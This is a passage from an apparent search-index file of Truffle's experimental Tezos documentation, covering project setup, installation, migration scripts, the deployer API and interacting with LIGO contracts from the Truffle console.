writing, few exist for Tezos. Note : To create a bare Truffle project with no smart contracts included, use `truffle init`. Note : You can use an optional `--force` to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for LIGO contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file , configured specifically for Tezos Ready to write some contracts? \u00b6 See the Writing LIGO Contracts section to get building!", "title": "Creating a Tezos Project"}, {"location": "docs/tezos/truffle/getting-started/creating-a-tezos-project/#creating-a-tezos-project", "text": "To use most Truffle commands, you need to run them against an existing Truffle project. So the first step is to create a Truffle project with Tezos. The best way to create a project with Tezos is to start with the tezos-example Truffle Box . Truffle boxes are example applications and project templates, and we've built one specifically for Tezos. Create a new directory for your Truffle project: mkdir tezos-example cd tezos-example Download (\"unbox\") the tezos-example box: truffle unbox tezos-example Note : You can use the `truffle unbox ` command to download any of the other Truffle Boxes , though note that as of this writing, few exist for Tezos. Note : To create a bare Truffle project with no smart contracts included, use `truffle init`. Note : You can use an optional `--force` to initialize the project in the current directory regardless of its state (e.g. even if it contains other files or directories). This applies to both the `init` and `unbox` commands. Be careful, this will potentially overwrite files that exist in the directory. Once this operation is completed, you'll now have a project structure with the following items: contracts/ : Directory for LIGO contracts migrations/ : Directory for scriptable deployment files test/ : Directory for test files for testing your application and contracts truffle-config.js : Truffle configuration file , configured specifically for Tezos", "title": "Creating a Tezos Project"}, {"location": "docs/tezos/truffle/getting-started/creating-a-tezos-project/#ready-to-write-some-contracts", "text": "See the Writing LIGO Contracts section to get building!", "title": "Ready to write some contracts?"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Deploying Tezos Contracts \u00b6 If you're familiar with Truffle, then you already know about Truffle's deployment framework , called Migrations, used to manage deployment changes over time. Overview \u00b6 To deploy Tezos contracts, you'll first need to write migration scripts to tell Truffle how to deploy those contracts. For the rest of this document, we'll be referring to deployment scripts as \"migrations\" to keep in line with Truffle's normal lingo. Keep in mind that a \"migration\" is synonymous with \"deployment script\". Migrations \u00b6 Migrations are JavaScript files that help you deploy contracts to a Tezos network. These files are responsible for staging and running your deployment tasks, and they're written under the assumption that your deployment needs will change over time (e.g., you'll add new scripts as time progresses, and your product matures). Command \u00b6 To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts. Migration files \u00b6 A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = ( deployer ) => { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required to tell Truffle which order to run the scripts. The suffix is purely for human readability and comprehension. artifacts.require() \u00b6 At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the source file, without the .ligo extension. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/SimpleStorage.ligo function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) To interact with this contract, in your deployment script, you'd use artifacts.require() like so: var SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module.exports \u00b6 All migrations must export a function via the module.exports syntax. The function exported of each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below. Handling default values \u00b6 A full migration script using SimpleStorage would look like the example below. Note that a default value ( 3 ) is passed to the deployer's deploy() function in order to set the contract's initial state. Note that the type of this second parameter must represent the type of state held in the contract, and should be represented in a form that is convertible from Javascript. More details on this below. Coming from Ethereum? You'll notice that LIGO contracts lack constructors. Passing in default values as part of deployment is the only way to set the initial state of a contract. Constructors may be added to LIGO at a later date. Filename: ./migrations/2_deploy_simple_storage.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = ( deployer ) => { deployer . deploy ( SimpleStorage , 3 ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps. Deployer \u00b6 Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page. Network considerations \u00b6 It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"delphinet\" ) { // Do something specific to the network named \"delphinet\". } else { // Perform a different step otherwise. } } Available accounts \u00b6 Migrations are also passed the list of accounts set up in your wallet, for you to use during your deployments. module . exports = function ( deployer , network , accounts ) { console . log ( accounts ); // => [ 'tz1iGB5P9bZkt356S2PYgAEUWCAuYEvwu152' ] // Example contract that takes in an owner as its default state. // In this case we use the same account we're using to deploy. deployer . deploy ( OwnedContract , accounts [ 0 ]); } Deployer API \u00b6 The deployer contains many functions available to simplify your migrations. deployer.deploy(contract [, initialState] [, options]) \u00b6 Deploy a specific contract, specified by the contract object. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. This function takes an optional initial state as its second argument, that sets the state of your contract on chain when deployed. The type of data passed in this argument should match the type data stored in the state represented by the contract. We use the Taquito library to perform the translation from Javascript representation to types understood by Tezos. Please see their documentation for more information. The last argument is an optional object that can include the key named overwrite . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without any initial state. deployer . deploy ( A ); // Deploy a single contract with an initial state of 3. deployer . deploy ( A , 3 ); // Don't deploy this contract if it has already been deployed. deployer . deploy ( A , { overwrite : false }); // More specific example: // // Don't redeploy if the contract object represents an already-deployed dependency. // If it has already been deployed to our target network, we can skip deploying it. // This is useful for cases where we _do_ want to deploy that dependency for testing // and development networks, but we don't want to replace them in production. deployer . deploy ( SomeDependency , { overwrite : false }); deployer.then(function() {...}) \u00b6 Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A programmatically, with 3 as the initial state. return A . new ( 3 ); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Send a transaction with the new instance of A's address using B's main() function. return b . main ( a . address ); });", "title": "Deploying Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#deploying-tezos-contracts", "text": "If you're familiar with Truffle, then you already know about Truffle's deployment framework , called Migrations, used to manage deployment changes over time.", "title": "Deploying Tezos Contracts"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#overview", "text": "To deploy Tezos contracts, you'll first need to write migration scripts to tell Truffle how to deploy those contracts. For the rest of this document, we'll be referring to deployment scripts as \"migrations\" to keep in line with Truffle's normal lingo. Keep in mind that a \"migration\" is synonymous with \"deployment script\".", "title": "Overview"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#migrations", "text": "Migrations are JavaScript files that help you deploy contracts to a Tezos network. These files are responsible for staging and running your deployment tasks, and they're written under the assumption that your deployment needs will change over time (e.g., you'll add new scripts as time progresses, and your product matures).", "title": "Migrations"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#command", "text": "To run your migrations, run the following: $ truffle migrate This will run all migrations located within your project's migrations directory. At their simplest, migrations are simply a set of managed deployment scripts.", "title": "Command"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#migration-files", "text": "A simple migration file looks like this: Filename: 4_example_migration.js var MyContract = artifacts . require ( \"MyContract\" ); module . exports = ( deployer ) => { // deployment steps deployer . deploy ( MyContract ); }; Note that the filename is prefixed with a number and is suffixed by a description. The numbered prefix is required to tell Truffle which order to run the scripts. The suffix is purely for human readability and comprehension.", "title": "Migration files"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#artifactsrequire", "text": "At the beginning of the migration, we tell Truffle which contracts we'd like to interact with via the artifacts.require() method. This method is similar to Node's require , but in our case it specifically returns a contract abstraction that we can use within the rest of our deployment script. The name specified should match the name of the source file, without the .ligo extension. Consider this example where two contracts are specified within the same source file: Filename: ./contracts/SimpleStorage.ligo function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) To interact with this contract, in your deployment script, you'd use artifacts.require() like so: var SimpleStorage = artifacts . require ( \"SimpleStorage\" );", "title": "artifacts.require()"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#moduleexports", "text": "All migrations must export a function via the module.exports syntax. The function exported of each migration should accept a deployer object as its first parameter. This object aides in deployment by both providing a clear syntax for deploying smart contracts as well as performing some of deployment's more mundane duties, such as saving deployed artifacts for later use. The deployer object is your main interface for staging deployment tasks, and its API is described at the bottom of this page. Your migration function can accept other parameters as well. See the examples below.", "title": "module.exports"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#handling-default-values", "text": "A full migration script using SimpleStorage would look like the example below. Note that a default value ( 3 ) is passed to the deployer's deploy() function in order to set the contract's initial state. Note that the type of this second parameter must represent the type of state held in the contract, and should be represented in a form that is convertible from Javascript. More details on this below. Coming from Ethereum? You'll notice that LIGO contracts lack constructors. Passing in default values as part of deployment is the only way to set the initial state of a contract. Constructors may be added to LIGO at a later date. Filename: ./migrations/2_deploy_simple_storage.js const SimpleStorage = artifacts . require ( \"SimpleStorage\" ); module . exports = ( deployer ) => { deployer . deploy ( SimpleStorage , 3 ); }; From here, you can create new migrations with increasing numbered prefixes to deploy other contracts and perform further deployment steps.", "title": "Handling default values"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#deployer", "text": "Your migration files will use the deployer to stage deployment tasks. As such, you can write deployment tasks synchronously and they'll be executed in the correct order: // Stage deploying A before B deployer . deploy ( A ); deployer . deploy ( B ); Alternatively, each function on the deployer can be used as a Promise, to queue up deployment tasks that depend on the execution of the previous task: // Deploy A, then deploy B, passing in A's newly deployed address deployer . deploy ( A ). then ( function () { return deployer . deploy ( B , A . address ); }); It is possible to write your deployment as a single promise chain if you find that syntax to be more clear. The deployer API is discussed at the bottom of this page.", "title": "Deployer"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#network-considerations", "text": "It is possible to run deployment steps conditionally based on the network being deployed to. This is an advanced feature, so see the Networks section first before continuing. To conditionally stage deployment steps, write your migrations so that they accept a second parameter, called network . Example: module . exports = function ( deployer , network ) { if ( network == \"delphinet\" ) { // Do something specific to the network named \"delphinet\". } else { // Perform a different step otherwise. } }", "title": "Network considerations"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#available-accounts", "text": "Migrations are also passed the list of accounts set up in your wallet, for you to use during your deployments. module . exports = function ( deployer , network , accounts ) { console . log ( accounts ); // => [ 'tz1iGB5P9bZkt356S2PYgAEUWCAuYEvwu152' ] // Example contract that takes in an owner as its default state. // In this case we use the same account we're using to deploy. deployer . deploy ( OwnedContract , accounts [ 0 ]); }", "title": "Available accounts"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#deployer-api", "text": "The deployer contains many functions available to simplify your migrations.", "title": "Deployer API"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#deployerdeploycontract-initialstate-options", "text": "Deploy a specific contract, specified by the contract object. This will set the address of the contract after deployment (i.e., Contract.address will equal the newly deployed address), and it will override any previous address stored. This function takes an optional initial state as its second argument, that sets the state of your contract on chain when deployed. The type of data passed in this argument should match the type data stored in the state represented by the contract. We use the Taquito library to perform the translation from Javascript representation to types understood by Tezos. Please see their documentation for more information. The last argument is an optional object that can include the key named overwrite . If overwrite is set to false , the deployer won't deploy this contract if one has already been deployed. This is useful for certain circumstances where a contract address is provided by an external dependency. For more information, please see the @truffle/contract documentation. Examples: // Deploy a single contract without any initial state. deployer . deploy ( A ); // Deploy a single contract with an initial state of 3. deployer . deploy ( A , 3 ); // Don't deploy this contract if it has already been deployed. deployer . deploy ( A , { overwrite : false }); // More specific example: // // Don't redeploy if the contract object represents an already-deployed dependency. // If it has already been deployed to our target network, we can skip deploying it. // This is useful for cases where we _do_ want to deploy that dependency for testing // and development networks, but we don't want to replace them in production. deployer . deploy ( SomeDependency , { overwrite : false });", "title": "deployer.deploy(contract [, initialState] [, options])"}, {"location": "docs/tezos/truffle/getting-started/deploying-tezos-contracts/#deployerthenfunction", "text": "Just like a promise, run an arbitrary deployment step. Use this to call specific contract functions during your migration to add, edit and reorganize contract data. Example: var a , b ; deployer . then ( function () { // Create a new version of A programmatically, with 3 as the initial state. return A . new ( 3 ); }). then ( function ( instance ) { a = instance ; // Get the deployed instance of B return B . deployed (); }). then ( function ( instance ) { b = instance ; // Send a transaction with the new instance of A's address using B's main() function. return b . main ( a . address ); });", "title": "deployer.then(function() {...})"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Installing Truffle with Tezos \u00b6 Installing Docker \u00b6 Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience. Other Requirements \u00b6 NodeJS v8.9.4 or later Windows, Linux or Mac OS X Installing Truffle \u00b6 You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command. Next step: Create a Truffle project with Tezos \u00b6 Once you have Truffle and Docker installed, you can move on to creating a Tezos project with Truffle.", "title": "Installation"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/#installing-truffle-with-tezos", "text": "", "title": "Installing Truffle with Tezos"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/#installing-docker", "text": "Before you can start developing Tezos applications with Truffle, you'll first need to ensure you have Docker installed on your machine. Installing docker let's Truffle easily use the latest LIGO compiler on any platform. See Docker install instructions for your platform. Docker on Windows: If you're developing on Windows, you need to install the Docker edge release instead of the mainline docker version. Trust us: This is a better experience.", "title": "Installing Docker"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/#other-requirements", "text": "NodeJS v8.9.4 or later Windows, Linux or Mac OS X", "title": "Other Requirements"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/#installing-truffle", "text": "You'll need to download a special version of Truffle to use Tezos. $ npm install -g truffle@tezos If you already have Truffle installed, we recommend uninstalling truffle before running the above command.", "title": "Installing Truffle"}, {"location": "docs/tezos/truffle/getting-started/installing-truffle-with-tezos/#next-step-create-a-truffle-project-with-tezos", "text": "Once you have Truffle and Docker installed, you can move on to creating a Tezos project with Truffle.", "title": "Next step: Create a Truffle project with Tezos"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/", "text": "Tezos support in Truffle is experimental. Give it a spin, and help us out by filing issues on Github . Interacting with your contracts \u00b6 Introduction \u00b6 If you were writing raw requests to the Tezos network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze. Making Transactions \u00b6 Every time you call a function against a contract on the Tezos blockchain, a transaction is recorded. Each transaction will cost you XTZ, the Tezos-specific token that powers the blockchain, and will change the blockchain's state. Transactions are powerful ways to \"write\" to the blockchain, and make changes that power the backend of your applications. As you'll see below, all your contract's data stored on chain, colloquially called \"storage\", is read from the blockchain all at once. Introducing abstractions \u00b6 Contract abstractions are the bread and butter of interacting with Tezos contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, extended specifically for Tezos, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the very simple SimpleStorage contract available to you via truffle unbox tezos-example command. function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) This contract has a single method, or \"entry point\", called main() . You'll notice that the first parameter to main() is an integer that gets stored in the contract's storage. The second parameter represents current state of the contract's storage at time of the function execution. Now let's look at the Javascript object called SimpleStorage provided for us by Truffle, as made available in the Truffle console : truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT1AiUNZTnTEbvuSZFcjSEW1V5yB6CW44sHc\" // - main: () // - storage: () // - send: () // ... Notice that the abstraction contains the same function you defined in your contract -- main() . It also contains some helper functions ( storage() and send() ), as well as the address of the contract on-chain. Multi-Entrypoint Contracts \u00b6 As described in the Writing Tezos Contracts section, you can define contracts that have multiple entry points. When you create a contract as defined in that section, Truffle does a lot of work to make interacting with that contract easier. Let's take a look: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) If you compile this contract and spin up the console, you'll see the following when you analyze the abstraction Truffle creates for you: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT19mnZBa9KCtfv1t47gz9ieKyoxhY8JUvy8\" // - increment: () // - decrement: () // - storage: () // - send: () // ... In this example, you'll notice a curious change: main() has been removed, and has been replaced by increment() and decrement() , which were two functions created by Truffle to make it easy to call the entry points defined in your contract. Executing contract functions \u00b6 Whenever you call contract functions via the abstraction, say main() , increment() or decrement() in the above examples, a transaction request is made against the configured Tezos network. Calling these functions from Javascript will create a transaction on the Tezos blockchain, and make a state change on the blockchain itself. You should consider these functions as \"writes\", where executing these functions write data to the blockchain. To perform \"reads\", and read storage data, you'll use the storage() helper function described below. Making a transaction \u00b6 Making a transaction is as easy as calling the abstraction functions Truffle provides for you. To make things easy, let's start with the SimpleStorage contract defined above. Like before, let's get the deployed instance of it, but let's also call the main() function to send the transaction, and then once complete, request the contract's storage data: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } There are a few things interesting about the above code: We called the abstraction's main() function directly. When calling the main() function, we only passed on parameter. The second (last) parameter of the main() function is provided by the underlying blockchain, and represents the current storage data of the contract. Because it's sent to the contract for us, we don't need to send it from the outside. We received a transaction response after calling main() , which included a transaction hash (the tx parameter in the response). The transaction hash describe the id of the transaction on the blockchain. We used the helper function, storage() , to get the storage data of the contract. The data of this particular contract is an integer, and in Javascript is represented by the BigNumber object, in this case with the value of 2 . This happens to be the value we sent to main() within our transaction! This is all well and good. Now let's try it with a multi-entrypoint contract: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > await instance . increment ( 2 ) // Make transaction against increment() entry point { tx : 'onsbwiB8HK9heBmcJAHRvadcH435waNPpKAMMMGLsiEYXRhtqhx' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 3 ] } This is very similar to the example above, except in this case we didn't call main() . We instead called one of the named entry points, increment() , and it was treated as a transaction, exactly as if we had called main() . Reading contract data \u00b6 As shown into the examples above, we can read the contract's data through the storage() function: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BigNumber object which we can then convert to a number. The BigNumber library is used because Tezos can represent larger numbers than are allowed natively by Javascript. Warning : If you try to convert a BigNumber that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. We suggest using BigNumber throughout your application. Note that the data you get back from the storage() function will represent the types and structure of the underlying data stored in your contract. Let's take a new example we haven't seen yet: // ExpandedStorage.ligo - much like SimpleStorage, but stores two values! type values is record firstValue : int; secondValue : int; end function main (const newValues : values; const storedValues : values) : (list(operation) * values) is block { storedValues := newValues } with ((nil : list(operation)), storedValues) In this contract, the contract's storage is represented by a LIGO record object that contains two integers, the first named firstValue , and the second named secondValue . When you call storage() from the Truffle console, you'll see you're given data that respresents the same structure: truffle ( development ) > let instance = await ExpandedStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data { firstValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] }, secondValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] } } Add a new contract to the network \u00b6 In the above cases, we've been using a contract abstraction that has already been deployed through Truffle's deployment system. You can deploy new contracts to the network within your own code by using .new() function provided by the top-level abstraction object: truffle ( developmnet ) > let newInstance = await SimpleStorage . new ( 3 ) // Deploy a new version of SimpleStorage truffle ( development ) > newInstance . address 'KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b' truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] } Use a contract at a specific address \u00b6 If you already have an address for a contract stored externally, you can create a new abstraction to represent the contract at that address, using the at() function provided by the top-level abstraction object: truffle ( development ) > let specificInstance = await SimpleStorage . at ( \"KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b\" ); truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] } Further reading \u00b6 The contract abstractions provided by Truffle wouldn't have been possible without the amazing Taquito library that does a lot of the heavy lifing for what you see above. Check out their documentation for more information.", "title": "Interacting with Your Contracts"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#interacting-with-your-contracts", "text": "", "title": "Interacting with your contracts"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#introduction", "text": "If you were writing raw requests to the Tezos network yourself in order to interact with your contracts, you'd soon realize that writing these requests is clunky and cumbersome. As well, you might find that managing the state for each request you've made is complicated . Fortunately, Truffle takes care of this complexity for you, to make interacting with your contracts a breeze.", "title": "Introduction"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#making-transactions", "text": "Every time you call a function against a contract on the Tezos blockchain, a transaction is recorded. Each transaction will cost you XTZ, the Tezos-specific token that powers the blockchain, and will change the blockchain's state. Transactions are powerful ways to \"write\" to the blockchain, and make changes that power the backend of your applications. As you'll see below, all your contract's data stored on chain, colloquially called \"storage\", is read from the blockchain all at once.", "title": "Making Transactions"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#introducing-abstractions", "text": "Contract abstractions are the bread and butter of interacting with Tezos contracts from Javascript. In short, contract abstractions are wrapper code that makes interaction with your contracts easy, in a way that lets you forget about the many engines and gears executing under the hood. Truffle uses its own contract abstraction via the @truffle/contract module, extended specifically for Tezos, and it is this contract abstraction that's described below. In order to appreciate the usefulness of a contract abstraction, however, we first need a contract to talk about. We'll use the very simple SimpleStorage contract available to you via truffle unbox tezos-example command. function main (const newValue : int; const storedValue : int) : (list(operation) * int) is block { storedValue := newValue } with ((nil : list(operation)), storedValue) This contract has a single method, or \"entry point\", called main() . You'll notice that the first parameter to main() is an integer that gets stored in the contract's storage. The second parameter represents current state of the contract's storage at time of the function execution. Now let's look at the Javascript object called SimpleStorage provided for us by Truffle, as made available in the Truffle console : truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT1AiUNZTnTEbvuSZFcjSEW1V5yB6CW44sHc\" // - main: () // - storage: () // - send: () // ... Notice that the abstraction contains the same function you defined in your contract -- main() . It also contains some helper functions ( storage() and send() ), as well as the address of the contract on-chain.", "title": "Introducing abstractions"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#multi-entrypoint-contracts", "text": "As described in the Writing Tezos Contracts section, you can define contracts that have multiple entry points. When you create a contract as defined in that section, Truffle does a lot of work to make interacting with that contract easier. Let's take a look: // variant defining pseudo multi-entrypoint actions type action is | Increment of int | Decrement of int function add (const a : int ; const b : int) : int is a + b function subtract (const a : int ; const b : int) : int is a - b // real entrypoint that re-routes the flow based on the action provided function main (const p : action ; const s : int) : (list(operation) * int) is ((nil : list(operation)), case p of | Increment (n) -> add (s, n) | Decrement (n) -> subtract (s, n) end) If you compile this contract and spin up the console, you'll see the following when you analyze the abstraction Truffle creates for you: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > instance // outputs: // // Contract // - address: \"KT19mnZBa9KCtfv1t47gz9ieKyoxhY8JUvy8\" // - increment: () // - decrement: () // - storage: () // - send: () // ... In this example, you'll notice a curious change: main() has been removed, and has been replaced by increment() and decrement() , which were two functions created by Truffle to make it easy to call the entry points defined in your contract.", "title": "Multi-Entrypoint Contracts"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#executing-contract-functions", "text": "Whenever you call contract functions via the abstraction, say main() , increment() or decrement() in the above examples, a transaction request is made against the configured Tezos network. Calling these functions from Javascript will create a transaction on the Tezos blockchain, and make a state change on the blockchain itself. You should consider these functions as \"writes\", where executing these functions write data to the blockchain. To perform \"reads\", and read storage data, you'll use the storage() helper function described below.", "title": "Executing contract functions"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#making-a-transaction", "text": "Making a transaction is as easy as calling the abstraction functions Truffle provides for you. To make things easy, let's start with the SimpleStorage contract defined above. Like before, let's get the deployed instance of it, but let's also call the main() function to send the transaction, and then once complete, request the contract's storage data: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . main ( 2 ) // Make transaction against main() function { tx : 'op8HbSFaHACRQrVZT7SmHjpRwqa9fDVxb6Zjwcyj57jwEgzKpcd' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } There are a few things interesting about the above code: We called the abstraction's main() function directly. When calling the main() function, we only passed on parameter. The second (last) parameter of the main() function is provided by the underlying blockchain, and represents the current storage data of the contract. Because it's sent to the contract for us, we don't need to send it from the outside. We received a transaction response after calling main() , which included a transaction hash (the tx parameter in the response). The transaction hash describe the id of the transaction on the blockchain. We used the helper function, storage() , to get the storage data of the contract. The data of this particular contract is an integer, and in Javascript is represented by the BigNumber object, in this case with the value of 2 . This happens to be the value we sent to main() within our transaction! This is all well and good. Now let's try it with a multi-entrypoint contract: truffle ( development ) > let instance = await Counter . deployed () truffle ( development ) > await instance . increment ( 2 ) // Make transaction against increment() entry point { tx : 'onsbwiB8HK9heBmcJAHRvadcH435waNPpKAMMMGLsiEYXRhtqhx' , ... } // transaction output truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 3 ] } This is very similar to the example above, except in this case we didn't call main() . We instead called one of the named entry points, increment() , and it was treated as a transaction, exactly as if we had called main() .", "title": "Making a transaction"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#reading-contract-data", "text": "As shown into the examples above, we can read the contract's data through the storage() function: truffle ( development ) > let instance = await SimpleStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data BigNumber { s : 1 , e : 0 , c : [ 2 ] } What's interesting here: We received a return value. Note that since the Ethereum network can handle very large numbers, we're given a BigNumber object which we can then convert to a number. The BigNumber library is used because Tezos can represent larger numbers than are allowed natively by Javascript. Warning : If you try to convert a BigNumber that's larger than the largest integer supported by Javascript, you'll likely run into errors or unexpected behavior. We suggest using BigNumber throughout your application. Note that the data you get back from the storage() function will represent the types and structure of the underlying data stored in your contract. Let's take a new example we haven't seen yet: // ExpandedStorage.ligo - much like SimpleStorage, but stores two values! type values is record firstValue : int; secondValue : int; end function main (const newValues : values; const storedValues : values) : (list(operation) * values) is block { storedValues := newValues } with ((nil : list(operation)), storedValues) In this contract, the contract's storage is represented by a LIGO record object that contains two integers, the first named firstValue , and the second named secondValue . When you call storage() from the Truffle console, you'll see you're given data that respresents the same structure: truffle ( development ) > let instance = await ExpandedStorage . deployed () truffle ( development ) > await instance . storage () // Get storage data { firstValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] }, secondValue : BigNumber { s : 1 , e : 0 , c : [ 3 ] } }", "title": "Reading contract data"}, {"location": "docs/tezos/truffle/getting-started/interacting-with-your-tezos-contracts/#add-a-new-contract-to-the-network", "text": "In the above cases, we've been using a contract abstraction that has already been deployed through Truffle's deployment system. You can deploy new contracts to the network within your own code by using .new() function provided by the top-level abstraction object: truffle ( developmnet ) > let newInstance = await SimpleStorage . new ( 3 ) // Deploy a new version of SimpleStorage truffle ( development ) > newInstance . address 'KT1Rt8CozyFb1HFhdkK7BLEcURsCtMxCYs1b' truffle ( development ) > await newInstance . storage () BigNumber { s : 1 , e : 0 , c : [ 3 ] }", "title": "Add a new contract to the 